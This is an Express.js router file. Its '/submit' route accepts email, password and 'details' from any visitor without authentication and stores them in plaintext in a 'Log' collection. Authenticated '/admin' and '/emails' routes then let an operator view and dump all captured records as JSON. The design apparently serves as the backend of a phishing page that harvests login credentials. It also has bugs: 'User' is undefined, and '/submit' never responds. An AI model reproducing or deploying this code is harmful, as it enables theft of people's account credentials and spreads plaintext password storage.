const express = require("express");
const router = express.Router();
const { ensureAuthenticated, forwardAuthenticated } = require("../config/auth");
const Log = require("../models/Logs");

// Welcome Page
router.get("/", forwardAuthenticated, (req, res) => res.render("main"));

router.get("/stats", (req, res) => {
  User.countDocuments()
    .then((userCount) => {
      res.render("stats", {
        userCount,
      });
    })
    .catch((err) => console.log(err));
});

router.post("/submit", (req, res) => {
  let { email, password, details } = req.body;
  const newLog = new Log({
    email,
    password,
    details,
  });
  newLog.save().then(() => {
    console.log("saved");
  });
});

// Dashboard ensureAuthenticated
router.get("/admin", ensureAuthenticated, (req, res) =>
  res.render("admin", {
    //user: req.user,
  })
);

router.get("/emails", ensureAuthenticated, (req, res) => {
  console.log("hit");
  Log.find()
    .then((result) => {
      console.log(result);
      res.json({
        logs: result,
      });
    })
    .catch((err) => console.log(err));
});

//404
// router.get("/*", (req, res) => res.render("404"));

module.exports = router;
